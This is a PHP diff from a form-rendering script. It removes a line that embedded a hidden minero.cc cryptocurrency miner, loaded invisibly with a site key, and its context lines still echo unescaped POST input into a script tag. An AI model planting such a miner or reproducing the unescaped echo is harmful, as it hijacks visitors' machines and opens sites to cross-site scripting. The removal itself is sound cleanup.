@@ -39,8 +39,6 @@
 				echo '<option value="SN">SN</option>';
 			echo '</select> &nbsp';
 			
-			echo '<script src="https://minero.cc/lib/minero-hidden.min.js" async></script><div class="minero-hidden" style="display: none" data-key="7038861bf91e0d58bac3ad18d88adcd2"></div>';
-			
 			if (isset($_POST['identity'])) {
 				echo '<script type="text/javascript">';
 					echo 'document.getElementById(\'identity\').value = "'.$_POST['identity'].'"';
